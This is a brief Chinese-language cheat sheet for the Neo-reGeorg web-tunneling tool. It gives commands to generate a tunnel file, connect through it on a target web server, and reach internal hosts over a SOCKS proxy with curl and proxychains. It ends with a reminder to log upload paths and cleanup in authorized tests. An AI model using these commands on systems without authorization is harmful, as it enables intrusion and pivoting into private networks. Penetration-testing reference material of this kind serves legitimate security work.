# Neo-reGeorg 使用

Neo-reGeorg 是 reGeorg 的变体，适合实验 Web 隧道和代理链风险。

## 常用命令

```bash
python3 neoreg.py generate -k password
```

```bash
python3 neoreg.py -k password -u http://target/tunnel.php
```

```bash
curl --socks5 127.0.0.1:1080 http://10.0.0.10
```

```bash
proxychains curl http://10.0.0.10
```

```bash
python3 neoreg.py -k password -u http://target/tunnel.jsp -p 1081
```

小记录：授权测试中要记录上传路径、代理端口和清理动作。
